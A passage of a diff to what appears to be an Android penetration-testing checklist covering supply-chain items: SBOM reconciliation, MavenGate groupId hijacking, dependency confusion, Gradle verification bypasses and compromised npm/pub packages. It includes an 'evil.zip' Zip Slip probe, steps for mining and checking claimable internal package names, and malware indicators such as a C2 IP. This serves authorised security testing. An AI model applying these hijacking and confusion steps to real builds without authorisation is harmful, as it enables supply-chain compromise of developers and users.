   because a legitimate archive format broke. That is a finding in itself, and it re-opens D17-056 for the
   whole process.
 - **How:**
   ```bash
-  grep -rn 'ZipPathValidator\|clearCallback' out/sources/
-  grep -n 'targetSdkVersion' out/apktool.yml
+  grep -rn 'ZipPathValidator\|clearCallback' $DEC/jadx/sources/
+  grep -n 'targetSdkVersion' $DEC/apktool/apktool.yml
   # confirm behaviourally
   adb push evil.zip /sdcard/Download/ && # import it through the app, then:
   adb shell run-as com.target.app ls shared_prefs/
@@ -2124,7 +2242,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | | |
 |---|---|
 | **Severity ceiling** | **Critical** when the symlink target is later written or loaded |
-| **VRT** | `server_security_misconfiguration.path_traversal` (VARIES) → `server_side_injection.remote_code_execution_rce` (P1) |
+| **VRT** | `server_security_misconfiguration.path_traversal` (varies) → `server_side_injection.remote_code_execution_rce` (P1) |
 | **Attacker** | AM-02 / AM-03 |
 | **Applies to** | all apps extracting downloaded or user-supplied archives |
 | **Requires** | device |
@@ -2164,9 +2282,14 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | n/a for the SBOM; each hit inherits its own node after D17-060 |
 | **Attacker** | n/a (tester step) |
 | **Applies to** | all; source-side half needs repo access, binary-side half does not |
+| **Requires** | — |
 | **Maps to** | MASTG-TEST-0274 (Dependencies with Known Vulnerabilities in the App's SBOM), MASTG-TECH-0130 (SCA by Creating an SBOM), MASTG-TOOL-0134 (cdxgen), MASTG-TOOL-0132 (dependency-track), MASTG-TOOL-0130 (blint), MASTG-TEST-0272, MASTG-TECH-0131, MASTG-TOOL-0131 (dependency-check); MASWE-0044; MASVS-CODE-3 |
 
-- **Test:** Scanning `node_modules` or a lockfile proves nothing about a DEX plus ARM64 binary. Produce
+- **Skip when:** never for the binary half; the source half is n/a with the note `n/a (black-box): no source
+  SBOM; binary-side SBOM recorded` when no repository is in scope.
+- **Test:** Cross-reference: D02-059 owns the binary SBOM in P2 — reuse its `apk-sbom.json` rather than
+  regenerating it; this item keeps the source-side SBOM and the reconciliation. Scanning `node_modules` or a
+  lockfile proves nothing about a DEX plus ARM64 binary. Produce
   **two** SBOMs — source-side (authoritative for coordinates) and binary-side (authoritative for what
   shipped) — and reconcile them. The reconciliation is the finding, not the scan.
 - **How:**
@@ -2179,13 +2302,14 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   ./gradlew :app:cyclonedxBom
   ./gradlew :app:dependencies --configuration releaseRuntimeClasspath > deps.txt
   # consume
-  osv-scanner scan -r ./android-project/ --format json --output-file osv.json
-  osv-scanner scan -L gradle/verification-metadata.xml
-  osv-scanner scan --all-packages --format=json ./android-project/
+  osv-scanner --version                                   # 2.x needs the `source` subcommand; v1 syntax drops the word
+  osv-scanner scan source -r ./android-project/ --format json --output osv.json
+  osv-scanner scan source -L gradle/verification-metadata.xml
+  osv-scanner scan source --all-packages --format json ./android-project/
   # or dependency-track, per MASTG-TEST-0274
   curl -X PUT "http://localhost:8081/api/v1/bom" \
     -H 'Content-Type: application/json' -H 'X-API-Key: <API KEY>' \
-    -d '{"project":"<PROJECT ID>","bom":"'"$(base64 -w0 apk-sbom.json)"'"}'
+    -d '{"project":"<PROJECT ID>","bom":"'"$(base64 < apk-sbom.json | tr -d '\n')"'"}'   # no -w0: BSD base64 has no such flag
   ```
   Then add the module-level `build.gradle` plugin if you have source and the client wants a repeatable
   control:
@@ -2219,6 +2343,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | without it, `using_components_with_known_vulnerabilities.outdated_software_version` (**P5**), every time |
 | **Attacker** | n/a (tester step) |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | MASTG-TECH-0129 (Verifying Android Dependencies at Runtime — explicitly the black-box-only fallback: "manual and cannot easily be automated"); the Jackson CVE-criteria wiki as the formalised version of the same logic; Project Zero's CVE-2022-2294 RCA ("the bug is only reachable in applications that use SDP munging") |
 
 - **Test:** For each CVE hit, demonstrate (a) the vulnerable class/method survived R8 into `classes*.dex`
@@ -2229,12 +2354,12 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   # (a) did the symbol survive shrinking?
   for d in $(unzip -Z1 target.apk 'classes*.dex'); do unzip -p target.apk "$d" > /tmp/$d; done
   dexdump -d /tmp/classes*.dex | grep -n "Lcom/squareup/okhttp3/internal/tls/OkHostnameVerifier;->verify"
-  jadx -d out target.apk && grep -rn "writeBitmapToUri\|SplitCompat.install\|enableDefaultTyping" out/sources/
+  grep -rn "writeBitmapToUri\|SplitCompat.install\|enableDefaultTyping" $DEC/jadx/sources/
   # (b) walk callers up in jadx-gui: Find Usage (Ctrl+Shift+X) until you reach one of
   #     onCreate/onNewIntent, onReceive, shouldOverrideUrlLoading/@JavascriptInterface,
   #     openFile/query, or a network-response parser
   # (c) confirm the frame is actually entered
-  frida -D "$SERIAL" -f com.target.app -l reach.js
+  frida -D "$SERIAL" -f com.target.app -t 120 -l reach.js
   ```
   ```javascript
   // reach.js — prove the sink executes, dump the argument and the stack that got there
@@ -2267,16 +2392,18 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | n/a |
 | **Attacker** | n/a (tester step) |
 | **Applies to** | all; essential for R8/ProGuard-obfuscated release builds |
+| **Requires** | — |
 | **Maps to** | LibScout README — profile/match commands, hashtree (Merkle) profiles built from original `.jar`/`.aar` SDKs, obfuscation resilience via identifier-independent structure, similarity scoring to an exact version or a 2–3 candidate set, `[SECURITY]`/`[SECURITY-FIX]` tags; its shipped vulnerable set includes OkHttp 2.1–2.7.4 and 3.0.0–3.1.2 (pinning bypass, fixed 2.7.5 / 3.2.0), Apache Commons Collections 3.2.1 / 4.0 (deserialization, fixed 3.2.2 / 4.1), Dropbox SDK 1.5.4–1.6.1 (fixed 1.6.2). MASTG-KNOW-0004; MASTG-TOOL-0022 (ProGuard obfuscates version info away) |
 
-- **Test:** When `META-INF/*.version` and `BuildConfig` are gone you still owe the triager a version. Use
+- **Test:** Cross-reference: D02-061 owns version fingerprinting after R8 stripping — cite it and keep only the
+  D17-060 hand-off here. When `META-INF/*.version` and `BuildConfig` are gone you still owe the triager a version. Use
   bytecode-structure fingerprinting, not package names — R8 renames those.
 - **How:**
   ```bash
   unzip -l target.apk | grep -E 'META-INF/.*\.version|\.properties'
   unzip -p target.apk 'META-INF/*.version'
   jadx --no-src -d out target.apk
-  grep -rn 'version\|VERSION\|BuildConfig' out/resources/ | grep -iE 'okhttp|retrofit|glide|gson|jackson|sqlcipher|exoplayer|realm'
+  grep -rn 'version\|VERSION\|BuildConfig' $DEC/jadx/resources/ | grep -iE 'okhttp|retrofit|glide|gson|jackson|sqlcipher|exoplayer|realm'
   # structural fingerprinting when the above is empty
   java -jar LibScout.jar -o profile -a android.jar -x lib.xml okhttp-4.9.1.aar
   java -jar LibScout.jar -o match -p ./profiles -a android.jar -u -j ./json target.apk
@@ -2295,9 +2422,11 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | rate on the demonstrated sink; version alone is `using_components_with_known_vulnerabilities.outdated_software_version` (P5) |
 | **Attacker** | AM-02 (a crafted file through the app's own feature) / AM-09 |
 | **Applies to** | all apps with `lib/*.so`; Unity, Flutter and any engine with vendored native dependencies |
+| **Requires** | native, device |
 | **Maps to** | LibRARIAN / *"Too Quiet in the Library"* — version strings from `.rodata` with the regexes below, plus five ELF metadata features matched by Jaccard similarity at 0.85; **91.15% correct version identification (824/904)**; **53 of the top 200 Google Play apps (26.5%) carried a vulnerable native library**; vulnerable libraries averaged **859.17 ± 137.55 days** out of date while library developers shipped patches in **54.59 ± 8.12 days** and app developers took **528.71 ± 40.20 days** to adopt them. Google Play ASI **libpng** and **libjpeg-turbo** campaigns (2016-06-16). MHL's Unity/FreeType table for **CVE-2025-27363**: 2021.3.x (EOL) bundles 2.12.1, vulnerable with no patch planned; 2022.3 < 62f1 bundles ≤ 2.13.0, vulnerable; 2022.3.62f1+ and 6000.0.47f1+ bundle 2.13.3, patched — and MHL's note that Flutter on iOS is not affected by that CVE but bundles its own HarfBuzz and remains exposed to **AIKIDO-2026-10356**. Also **CVE-2023-4863** (libwebp), **CVE-2022-2294 / CVE-2023-7024 / CVE-2024-5493** (WebRTC) |
 
-- **Test:** Native libraries are the least-patched part of an Android app and are invisible to
+- **Test:** Cross-reference: D16-006 owns `.rodata` fingerprinting of bundled native libraries — reuse its table
+  here rather than re-running the sweep. Native libraries are the least-patched part of an Android app and are invisible to
   Maven-coordinate SCA by construction. Game and cross-platform engines statically link their own copies of
   system libraries, so an OS patch does nothing for them — the "10× patch lag" numbers above are the
   strongest argument you have that a native-lib finding is real.
@@ -2307,12 +2436,12 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   for so in $(find x/lib -name '*.so'); do
     echo "=== $so"
     strings -a "$so" | grep -aoE 'ffmpeg-([0-9]\.)*[0-9]|openssl-1(\.[0-9])*[a-z]|OpenSSL 1\.[0-9]\.[0-9][a-z]?|^3\.([0-9]{1,}\.)+[0-9]|libpng version [0-9.]+|libjpeg-turbo [0-9.]+|zlib [0-9.]+|libxml2-[0-9.]+|GIFLIB [0-9.]+|WebP [0-9.]+|FreeType [0-9.]+|HarfBuzz [0-9.]+' | sort -u
-    readelf -d "$so" | grep -E 'NEEDED|SONAME'
+    llvm-readelf -d "$so" | grep -E 'NEEDED|SONAME'        # binutils readelf/nm are Linux-only; llvm-* ship with the NDK and Homebrew's llvm keg; `rabin2 -l` / `rabin2 -i` (radare2) is the portable alternative
   done
   # engine identification
   ls x/lib/*/ | grep -iE 'unity|il2cpp|flutter|hermes|jsc|webrtc|jingle|peerconnection'
   # JNI entry points that could feed a vulnerable parser
-  for so in x/lib/arm64-v8a/*.so; do nm -D --defined-only "$so" 2>/dev/null | grep ' T Java_' | head -40; done
+  for so in x/lib/arm64-v8a/*.so; do llvm-nm -D --defined-only "$so" 2>/dev/null | grep ' T Java_' | head -40; done
   ```
 - **Proof:** A table of `.so path | library | version string | matching advisory`. The raw `strings` line is
   the citable evidence. Then the reachability half: a JNI entry point hooked and fired by input the attacker
@@ -2333,9 +2462,14 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) is where it lands if demonstrated; most bounty programmes scope the build pipeline out, so check scope before spending time here |
 | **Attacker** | AM-01 (an unauthenticated third party needs only a credit card) |
 | **Applies to** | all Gradle/Maven-built Android apps; needs source access or a published dependency list |
+| **Requires** | — |
 | **Maps to** | Oversecured *"Introducing MavenGate"* — groupId ownership proved via a DNS TXT record on the reversed domain (publishing under `com.google.code.gson` requires a TXT record for `gson.code.google.com`); affected repositories **Maven Central, JitPack, JCenter** and "All Maven-based technologies including Gradle"; steps: identify an abandoned dependency → buy the expired domain or claim the free GitHub username → register the groupId → publish a rogue artifact; on resolution, "newer version numbers trigger updates *regardless of the position* of repositories in the declaration list"; **statistics: 26,163 domains mapped from Maven Central groupIds, 3,710 (14.18%) purchasable; 7,523 GitHub-based projects, 291 (3.86%) vulnerable; with private repositories, 33,938 domains and 6,170 (18.18%) vulnerable**; top abandoned dependencies by share of vulnerable cases included `co.fs2` (10.63%), `net.jpountz.lz4` (4.21%), `org.mvel` (3.60%), `org.tpolecat` (3.29%), `com.opencsv` (3.11%); "Most applications do not check the digital signature of dependencies, and many libraries do not even publish it", including "a huge number of unsigned dependencies from Google"; reports went to 200+ companies including Google, Facebook, Signal and Amazon. MASWE-0044, MASWE-0048 |
 
-- **Test:** Maven `groupId`s are reverse domains and repositories prove ownership by DNS TXT. If a
+- **Skip when:** `unzip -Z1 "$E/apk/base.apk" | grep -cE '^META-INF/.*\.version$'` is 0 **and** no source repository is in scope
+  (`unzip -Z1 "$E/apk/base.apk" | grep -q 'empty_asset_generated_by_bazel'` identifies a Bazel build) → notes `n/a (black-box): build system not
+  Gradle / no source access; binary-side SBOM (D17-059) and the binary-side duplicate-class check of D17-069 recorded instead`.
+- **Test:** Cross-reference: D02-055 owns the MavenGate `groupId` sweep in P2 — cite it here and keep the D17-069
+  consequence. Maven `groupId`s are reverse domains and repositories prove ownership by DNS TXT. If a
   dependency's groupId maps to an expired domain — or an `io.github.<user>` coordinate whose GitHub username
   is free — anyone can claim it and publish a **higher version**, which Gradle prefers regardless of
   repository order.
@@ -2394,8 +2528,12 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) for the build compromise; the leaked internal coordinate alone is `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) |
 | **Attacker** | AM-01 (needs only the coordinate name) |
 | **Applies to** | all builds mixing internal and public repositories, version-catalog (`libs.versions.toml`) builds included |
+| **Requires** | — |
 | **Maps to** | Gradle/Android repository content-filtering guidance (`maven { url "https://jitpack.io"; content { includeGroup "com.example"; includeModule("com.example","foo"); excludeGroupByRegex("dev\\.spght\\..*") } }`, with the stated limitation that filtering "does not verify dependencies themselves are legitimate — use alongside checksum verification"); Android "Gradle dependency resolution" / "Dependency verification" docs; H1 #1763343 (`hyperledger/aries-mobile-agent-react-native`, $0); H1 #1439355 (Shopify `unity-buy-sdk` GitHub action takeover) |
 
+- **Skip when:** `unzip -Z1 "$E/apk/base.apk" | grep -cE '^META-INF/.*\.version$'` is 0 **and** no source repository is in scope
+  (`unzip -Z1 "$E/apk/base.apk" | grep -q 'empty_asset_generated_by_bazel'` identifies a Bazel build) → notes `n/a (black-box): build system not
+  Gradle / no source access; binary-side SBOM (D17-059) and the binary-side duplicate-class check of D17-069 recorded instead`.
 - **Test:** If the build lists a public repository alongside an internal one **without content filtering**,
   an attacker who learns an internal coordinate publishes a higher version publicly and wins resolution.
   The disclosed bounty outcomes here are low ($0 in both cited reports) — file it where the coordinate
@@ -2409,8 +2547,8 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   ./gradlew --refresh-dependencies help \
     -Dhttp.proxyHost=127.0.0.1 -Dhttp.proxyPort=8080 -Dhttps.proxyHost=127.0.0.1 -Dhttps.proxyPort=8080
   # black-box variant: mine internal names out of the shipped artifact
-  strings -a out/classes*.dex | grep -oE 'com\.<client>\.[a-z0-9.]+' | sort -u | head -50
-  grep -rIn '"name"\s*:' out/assets/*.json 2>/dev/null | head
+  unzip -p "$E/apk/base.apk" 'classes*.dex' | strings -a | grep -oE 'com\.<client>\.[a-z0-9.]+' | sort -u | head -50
+  grep -rIn '"name"\s*:' $DEC/apktool/assets/*.json 2>/dev/null | head
   npm view <internal-package-name>        # exists publicly == already claimed; 404 == claimable
   ```
 - **Proof:** Proxy log lines showing internal coordinates requested from a **public** host — that alone is
@@ -2429,9 +2567,12 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
 | **Attacker** | AM-01 |
 | **Applies to** | **LEGACY — Gradle 5.1 through 6.8.3 only**, fixed in 7.0. Still routinely present in long-lived enterprise Android repos |
-| **Requires** | legacy |
+| **Requires** | — |
 | **Maps to** | **GHSA-jvmj-rh6q-x395 / CVE-2021-29427** — `content { includeGroup … }` / `exclusiveContent` filters inside a `settings.gradle` `pluginManagement {}` block are ignored; CVSS **8.0**, CWE-829 (Inclusion of Functionality from Untrusted Control Sphere); impacts: information disclosure of internal package identifiers and dependency confusion/poisoning via name squatting |
 
+- **Skip when:** `unzip -Z1 "$E/apk/base.apk" | grep -cE '^META-INF/.*\.version$'` is 0 **and** no source repository is in scope
+  (`unzip -Z1 "$E/apk/base.apk" | grep -q 'empty_asset_generated_by_bazel'` identifies a Bazel build) → notes `n/a (black-box): build system not
+  Gradle / no source access; binary-side SBOM (D17-059) and the binary-side duplicate-class check of D17-069 recorded instead`.
 - **Test:** On those Gradle versions, the filter that the team believes confines internal **plugin**
   coordinates to the internal repository does nothing, and a squatted public plugin can be resolved instead.
   A plugin executes in the build with full CI privileges.
@@ -2455,11 +2596,15 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | | |
 |---|---|
 | **Severity ceiling** | Medium — a missing/neutered integrity control on the path that produces the signed release binary |
-| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (VARIES). Argue impact via D17-063/064, never in the abstract |
+| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies). Argue impact via D17-063/064, never in the abstract |
 | **Attacker** | AM-01 (as the enabler) |
 | **Applies to** | Gradle builds; the bypass variant is **Gradle 6.2 through 7.4.2**, fixed in 7.5 |
+| **Requires** | — |
 | **Maps to** | Gradle dependency-verification userguide (`--write-verification-metadata sha256\|sha256,pgp`, `--dry-run`, modes `strict`/`lenient`/`off`, `<trusted-key>`, `<trusted-artifacts>`, and that **SNAPSHOTs are not verified** because "checksums change constantly"); Android docs (`./gradlew --write-verification-metadata pgp,sha256 --export-keys help`, the `<trusted-key id="…"><trusting group="androidx.activity"/></trusted-key>` output shape, `keyring-format`, `key-servers enabled="false"`); **GHSA-j6wc-xfg8-jx2j** — an entry with a `gpg` element but no `checksum` element is accepted without validation whenever signature verification cannot be completed; patched in 7.5 by "making sure to run checksum verification if signature verification cannot be completed, whatever the reason" |
 
+- **Skip when:** `unzip -Z1 "$E/apk/base.apk" | grep -cE '^META-INF/.*\.version$'` is 0 **and** no source repository is in scope
+  (`unzip -Z1 "$E/apk/base.apk" | grep -q 'empty_asset_generated_by_bazel'` identifies a Bazel build) → notes `n/a (black-box): build system not
+  Gradle / no source access; binary-side SBOM (D17-059) and the binary-side duplicate-class check of D17-069 recorded instead`.
 - **Test:** Absence of `gradle/verification-metadata.xml` means every dependency and every plugin is
   accepted on trust from whichever repository answered first. Presence is not enough either: blanket
   `<trust group="…"/>` entries disable verification for everything they match, a large `<ignored-key>` count
@@ -2495,11 +2640,15 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | | |
 |---|---|
 | **Severity ceiling** | Medium standalone; High combined with a hijackable groupId — the dynamic version is what makes the "publish a higher version" step automatic |
-| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (VARIES) as the control failure; chain to D17-063 for impact |
+| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies) as the control failure; chain to D17-063 for impact |
 | **Attacker** | AM-01 |
 | **Applies to** | all Gradle builds |
+| **Requires** | — |
 | **Maps to** | Oversecured MavenGate (higher versions win "regardless of the position" of repositories); Gradle dependency-verification docs (SNAPSHOTs are **not** verified); the real-world coordinate `com.theartofdev.edmodo:android-image-cropper:2.8.+` |
 
+- **Skip when:** `unzip -Z1 "$E/apk/base.apk" | grep -cE '^META-INF/.*\.version$'` is 0 **and** no source repository is in scope
+  (`unzip -Z1 "$E/apk/base.apk" | grep -q 'empty_asset_generated_by_bazel'` identifies a Bazel build) → notes `n/a (black-box): build system not
+  Gradle / no source access; binary-side SBOM (D17-059) and the binary-side duplicate-class check of D17-069 recorded instead`.
 - **Test:** A dynamic version means the build output is not reproducible and anyone who can publish *any*
   higher version into *any* configured repository silently wins. SNAPSHOTs are additionally exempt from
   Gradle's verification.
@@ -2523,8 +2672,12 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
 | **Attacker** | AM-01 / AM-06 (on the CI network, for the HTTP variant) |
 | **Applies to** | all Gradle projects |
+| **Requires** | — |
 | **Maps to** | Gradle *"Protecting Project Integrity"* ("Inspect the build scripts and any contributed code before running any tasks"; wrapper checksum validation; `distributionSha256Sum` in `gradle-wrapper.properties`; `gradle :wrapper` regeneration from a known-good local distribution); the Plugin Portal defaults to HTTPS with manual inspection of new plugins; **GHSA-j6wc-xfg8-jx2j** impact section ("Man-in-the-middle attacks: HTTP-based downloads remain vulnerable to interception and replacement"); safeguard.sh ("a single malicious build.gradle file can run arbitrary commands on a developer laptop or a CI runner before a single test executes… exfiltrate environment variables (including CI secrets like signing keys and Play Store API tokens)"); ATT&CK T1474.001 (mitigation M1013) |
 
+- **Skip when:** `unzip -Z1 "$E/apk/base.apk" | grep -cE '^META-INF/.*\.version$'` is 0 **and** no source repository is in scope
+  (`unzip -Z1 "$E/apk/base.apk" | grep -q 'empty_asset_generated_by_bazel'` identifies a Bazel build) → notes `n/a (black-box): build system not
+  Gradle / no source access; binary-side SBOM (D17-059) and the binary-side duplicate-class check of D17-069 recorded instead`.
 - **Test:** Build scripts are executable Groovy/Kotlin. Any plugin, wrapper jar or artefact resolved from an
   unvetted or plaintext source runs with full CI privileges **before** any test executes, with access to the
   upload keystore, `local.properties` and the Play publishing service account.
@@ -2534,7 +2687,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   grep -rn -A10 'pluginManagement' settings.gradle settings.gradle.kts
   grep -rnE '^\s*(id|classpath)\b' build.gradle* settings.gradle* buildSrc/**/*.gradle* 2>/dev/null | sort -u
   # wrapper integrity
-  sha256sum gradle/wrapper/gradle-wrapper.jar         # compare with Gradle's published checksums
+  shasum -a 256 gradle/wrapper/gradle-wrapper.jar     # compare with Gradle's published checksums (shasum exists on macOS and Linux; sha256sum does not)
   grep -n 'distributionUrl\|distributionSha256Sum' gradle/wrapper/gradle-wrapper.properties
   # plaintext repositories
   grep -rnE "maven[^\n]*\{[^}]*url[^}]*['\"]http://" --include='*.gradle' --include='*.gradle.kts' .
@@ -2559,12 +2712,16 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | | |
 |---|---|
 | **Severity ceiling** | High when the shadowed class is security-relevant (a verifier, a signer, a crypto helper) |
-| **VRT** | `cryptographic_weakness.insecure_implementation.improper_following_of_specification` (VARIES); `server_side_injection.remote_code_execution_rce` (P1) chained with D17-063 |
+| **VRT** | `cryptographic_weakness.insecure_implementation.improper_following_of_specification` (varies); `server_side_injection.remote_code_execution_rce` (P1) chained with D17-063 |
 | **Attacker** | AM-01 / AM-08 |
 | **Applies to** | all Gradle/JVM builds |
+| **Requires** | — |
 | **Maps to** | Gradle blog *"Detecting Maven-Hijack-style risks in Gradle builds with the Dependency Analysis Gradle Plugin"* — DAGP 3.5.0+, `buildHealth`/`reason`/`fixDependencies`, three risk categories (no duplicates / identical duplicates / **incompatible duplicates**) |
 
-- **Test:** Two dependencies provide the same fully-qualified class; the classloader takes the first on the
+- **Skip when:** never fully — without source run the binary-side duplicate-class check below; the `buildHealth` half is n/a with the note
+  `n/a (black-box): no Gradle build to analyse; binary-side duplicate-class check recorded`.
+- **Test:** Cross-reference: D02-056 owns the build-side (`buildHealth`) check in P2 — cite it; this item keeps the
+  binary-side duplicate-class variant and the D17-063 chain. Two dependencies provide the same fully-qualified class; the classloader takes the first on the
   classpath. An attacker who controls an *earlier* dependency shadows a class belonging to a *later*,
   trusted one without touching app code — silent behaviour substitution inside the app's own process.
 - **How:**
@@ -2579,6 +2736,13 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   ```bash
   ./gradlew buildHealth
   ./gradlew :app:reason --id :suspect-lib
+  ```
+  Binary-side variant (black-box, Bazel/monorepo or any non-Gradle build — this replaces `buildHealth`): a
+  duplicate FQCN across DEX files, or between a shaded copy and its unshaded original, is the Maven-Hijack signal.
+  ```bash
+  for d in $(unzip -Z1 "$E/apk/base.apk" 'classes*.dex'); do
+    unzip -p "$E/apk/base.apk" "$d" | dexdump -l plain - 2>/dev/null | grep -oE "Class descriptor *: *'L[^;]+;'"
+  done | sort | uniq -d | tee logs/D17-069.txt | wc -l
   ```
 - **Proof:** A `buildHealth` entry flagging **binary-incompatible** duplicate classes, e.g.
   `Expected METHOD com/example/trusty/TrustyService.greet(Ljava/lang/String;)Ljava/lang/String;, but was
@@ -2596,8 +2760,12 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | n/a for the process finding; whatever bug you then demonstrate carries the rating |
 | **Attacker** | n/a (tester step) |
 | **Applies to** | all; especially any library with a community fork |
+| **Requires** | — |
 | **Maps to** | the Android-Image-Cropper family — `com.theartofdev.edmodo` → `com.github.arthurhub` (repository "NOT currently maintained", development halted at 2.8.0) → `com.canhub` → `com.vanniktech`; "an SCA rule keyed on one groupId sees at most a third of this family"; "Blacklisting one allows the vulnerable code to arrive via JitPack mirrors or archived forks" |
 
+- **Skip when:** `unzip -Z1 "$E/apk/base.apk" | grep -cE '^META-INF/.*\.version$'` is 0 **and** no source repository is in scope
+  (`unzip -Z1 "$E/apk/base.apk" | grep -q 'empty_asset_generated_by_bazel'` identifies a Bazel build) → notes `n/a (black-box): build system not
+  Gradle / no source access; binary-side SBOM (D17-059) and the binary-side duplicate-class check of D17-069 recorded instead`.
 - **Test:** An SCA rule keyed on one `groupId` sees only a fraction of a forked library family. Search for
   *all* known coordinates and for JitPack mirrors of archived forks — then check at class level, which
   survives coordinate renaming entirely.
@@ -2607,7 +2775,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
     --include='*.gradle' --include='*.gradle.kts' --include='*.toml' .
   grep -rn "jitpack.io" --include='*.gradle*' --include='settings.gradle*' .
   # class-level check
-  jadx -d out target.apk && grep -rl "class CropImageActivity\|CropImageView" out/sources/
+  grep -rl "class CropImageActivity\|CropImageView" $DEC/jadx/sources/
   ```
 - **Proof:** A dependency declared under an archived or unmaintained coordinate, or the vulnerable class
   present in the DEX while the SCA report shows the library as "not present".
@@ -2623,6 +2791,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | rate the demonstrated bug; `using_components_with_known_vulnerabilities.outdated_software_version` (P5) if all you have is the abandonment |
 | **Attacker** | n/a (tester step) |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | "abandonment itself constitutes grounds for removal, regardless of CVE status"; Oversecured MavenGate (abandoned libraries are also the MavenGate precondition) |
 
 - **Test:** Libraries whose upstream is archived accumulate unpatched bugs with **no advisory stream**, so
@@ -2667,8 +2836,11 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) on the build host; scope it correctly, it is not an end-user-device finding |
 | **Attacker** | AM-01 against the build host |
 | **Applies to** | React Native projects; check both the app repo and every developer/CI host |
+| **Requires** | react-native |
 | **Maps to** | StepSecurity (2026-03) — compromised `react-native-international-phone-number` **0.11.8, 0.12.1, 0.12.2, 0.12.3** (last safe 0.11.7) and `react-native-country-select` **0.3.91, 0.4.1, 0.4.2** (last safe 0.4.0), with relays `@agnoliaarisian7180/string-argv` (0.3.0, 0.3.1) and `@usebioerhold8733/s-format` (2.0.1–2.0.4); mechanism: wave 1 a `preinstall` hook running an 18.9 KB obfuscated `install.js`, waves 2–3 a three-layer relay ending in a `postinstall` hook launching a 364-byte `child.js` as a detached child; behaviour: a 10-second sandbox-evasion delay, geolocation filtering against Russian/CIS indicators, Solana-blockchain C2 polling against wallet `6YGcuyFRJKZtcaYCCFba9fScNUvPkGXodXE1mJiSzqDJ` across nine RPC endpoints, payload fetch from `http://45.32.150.251` (Vultr, AS20473) decrypted using the `secretkey` and `ivbase64` HTTP headers, in-memory execution via `eval()`/`vm.Script`, and a `~/init.json` 48-hour rate-limit lock. Wiz (2025-06) — 16 React Native / GlueStack packages backdoored with whitespace-obfuscated code; a RAT supporting arbitrary command execution, exfiltration, persistent C2 with version-based server switching, `ss_info` and `ss_ip` commands, dependency installation (`axios`, `socket.io-client`), file upload and shell execution; chain began with `@react-native-aria/focus@0.2.10` on 2025-06-06. OSV tracks malicious packages under the `MAL-` id namespace |
 
+- **Skip when:** `engagement.json.target.framework` is not react-native, or no lockfile / source repository is in scope → notes
+  `n/a: framework=<value> / no lockfile in scope`.
 - **Test:** Check the lockfile and the extracted bundle for the specific compromised versions, and the
   developer/CI hosts for the execution artefacts.
 - **How:**
@@ -2704,6 +2876,8 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **Requires** | react-native |
 | **Maps to** | **CVE-2025-11953** — `@react-native-community/cli`, CVSS **9.8**, unauthenticated OS command execution via the development server's `/open-url` endpoint passing unfiltered input to `open()`; affects 4.8.0 through 20.0.0-alpha.2, patched by Meta in **20.0.0**. Also `cordova-plugin-acuant` removed from npm in July 2024 for dropping malicious code at install; **CVE-2023-2507** (CleverTap Cordova Plugin ≤ 2.6.2, unsanitised deeplink → arbitrary JS in the main WebView context) |
 
+- **Skip when:** `engagement.json.target.framework` is not react-native (or cordova) and no source repository is in scope → notes
+  `n/a: framework=<value> / no source repository in scope`.
 - **Test:** The 2025 mobile-tooling RCEs landed on the developer machine, not the device. Report them that
   way; conflating the two in a report is a fast way to lose the reader.
 - **How:**
@@ -2731,7 +2905,9 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **Requires** | flutter |
 | **Maps to** | **CVE-2026-27704** — Dart SDK before **3.11.0** and Flutter SDK before **3.41.0**, Zip Slip during Pub package extraction letting a malicious package archive write outside the Pub-cache destination. The XCSSET incident: the macOS worm infected the `example/` directory of `universal_file_viewer` **0.1.5** on pub.dev (~500 downloads), injecting malicious build hooks into Android Gradle, Xcode and git build files when the maintainer published — with the textbook reachability caveat that "simply adding universal_file_viewer to pubspec.yaml and building an app does not trigger the malware, as the infected files live only inside the example/ directory, which ships in the pub.dev tarball but is never compiled as a dependency". OSV `MAL-` namespace (e.g. `MAL-2024-11812`, `MAL-2025-189`) |
 
-- **Test:** Two distinct issues: a malicious or compromised pub package, and the Zip Slip in the toolchain
+- **Skip when:** `engagement.json.target.framework` is not flutter → notes `n/a: framework=<value>`; without a source repository only the
+  binary half (pub package names from `assets/flutter_assets`) applies — say so.
